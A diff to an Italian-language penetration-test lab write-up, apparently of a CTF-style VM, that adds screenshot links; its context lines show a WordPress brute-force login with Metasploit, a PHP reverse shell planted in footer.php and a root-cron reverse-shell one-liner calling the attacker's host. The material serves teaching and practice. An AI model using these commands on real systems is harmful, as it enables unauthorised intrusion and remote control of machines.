@@ -471,6 +471,7 @@ PORT   STATE SERVICE VERSION
 |_http-robots.txt: 1 disallowed entry
 |_/backup_wordpress
 ```
+![Testo alternativo](IMG/11_nmap_vuln_robots.png)
 
 **Analisi:**  
 Il file robots.txt rivela la presenza di una directory nascosta `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta.
@@ -478,12 +479,16 @@ Il file robots.txt rivela la presenza di una directory nascosta `/backup_wordpre
 **Impatto:** MEDIUM  
 Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco.
 
+![Testo alternativo](IMG/12_robots_txt.png)
+
 ---
 
 ### Fase 12: Scoperta Installazione WordPress
 
 **Metodo di Accesso:** Browser  
 **URL:** http://192.168.50.6/backup_wordpress
+
+![Testo alternativo](IMG/13_wp_installation.png)
 
 **Findings:**
 
@@ -521,6 +526,7 @@ msf auxiliary(scanner/http/wordpress_login_enum) > set TARGETURI /backup_wordpre
 msf auxiliary(scanner/http/wordpress_login_enum) > set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
 msf auxiliary(scanner/http/wordpress_login_enum) > run
 ```
+![Testo alternativo](IMG/15_wp_login.png)
 
 **Detection Results:**
 ```
@@ -567,6 +573,8 @@ Matching Modules
 - **Password:** enigma
 - **Access Level:** WordPress Administrator
 
+![Testo alternativo](IMG/16_john_password.png)
+
 **Gravità:** CRITICAL  
 **Impatto:** Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.
 
@@ -591,6 +599,7 @@ Password: ••••••
 [✓] Remember Me
 [Log In]
 ```
+![Testo alternativo](IMG/17_wp_login_php.png)
 
 **Admin Dashboard Access Confirmed:**
 - Full administrative privileges
@@ -598,6 +607,8 @@ Password: ••••••
 - Access to plugin editor
 - Ability to upload files
 - Complete control over WordPress installation
+
+![Testo alternativo](IMG/18_wp_dashboard.png)
 
 ---
 
@@ -645,6 +656,7 @@ Author: the WordPress team
 ...
 */
 ```
+![Testo alternativo](IMG/19_wp_editor.png)
 
 **Available Template Files:**
 - 404 Template (404.php)
@@ -681,6 +693,7 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 ```
+![Testo alternativo](IMG/20_rev_shell.png)
 
 **Attack Configuration:**
 - **Attacker IP:** 192.168.50.5 (Kali Linux)
@@ -702,6 +715,7 @@ Il codice della reverse shell è stato inserito all'inizio del file footer.php, 
 ```bash
 nc -lvnp 4444
 ```
+![Testo alternativo](IMG/21_listener.png)
 
 **Listener Status:**
 ```
@@ -737,6 +751,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami
 www-data
 ```
+
+![Testo alternativo](IMG/22_shell_established.png)
 
 **Initial Access Achieved:**
 - **User:** www-data
@@ -785,6 +801,10 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 - Script eseguito **ogni minuto** come **root**
 - Potenziale vettore per privilege escalation se modificabile
 
+![Testo alternativo](IMG/23_cron.png)
+
+
+
 ---
 
 ### Fase 22: Analisi Permessi Script Cron
@@ -799,6 +819,8 @@ rm -rf /var/log/apache2/*    # Clean those damn logs!!
 $ ls -la /usr/local/bin/cleanup
 -rwxrwxrwx 1 root root 64 Mar  3  2018 /usr/local/bin/cleanup
 ```
+
+![Testo alternativo](IMG/24_job_permissions.png)
 
 **CRITICAL SECURITY ISSUE:**
 
@@ -830,6 +852,8 @@ Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e 
 nc -lvnp 443
 ```
 
+![Testo alternativo](IMG/25_listener.png)
+
 **Listener Configuration:**
 ```
 listening on [any] 443 ...
@@ -857,6 +881,8 @@ rm -rf /var/log/apache2/*    # Clean those damn logs!!
 $ echo '#!/bin/bash' > /usr/local/bin/cleanup
 $ echo 'sh -i >& /dev/tcp/192.168.50.5/443 0>&1' >> /usr/local/bin/cleanup
 ```
+
+![Testo alternativo](IMG/26_edit_the_script.png)
 
 **Injected Payload:**
 ```bash
@@ -887,6 +913,8 @@ sh: 0: can't access tty; job control turned off
 root
 #
 ```
+
+![Testo alternativo](IMG/27_shell_access_as_root.png)
 
 **ROOT SHELL OBTAINED:**
 - **User:** root (uid=0)
